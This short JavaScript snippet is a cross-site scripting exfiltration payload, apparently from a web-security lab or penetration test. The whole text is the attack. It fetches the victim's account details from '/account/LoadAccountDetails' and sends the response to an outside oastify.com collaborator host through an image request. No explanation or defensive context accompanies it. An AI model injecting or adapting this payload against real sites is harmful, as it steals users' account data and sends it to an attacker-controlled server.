fetch('/account/LoadAccountDetails')
  .then(r => r.text())
  .then(d => new Image().src = 'https://splvgq7j30keqk5k8p59raw7hynpbhz6.oastify.com?' + encodeURIComponent(d));
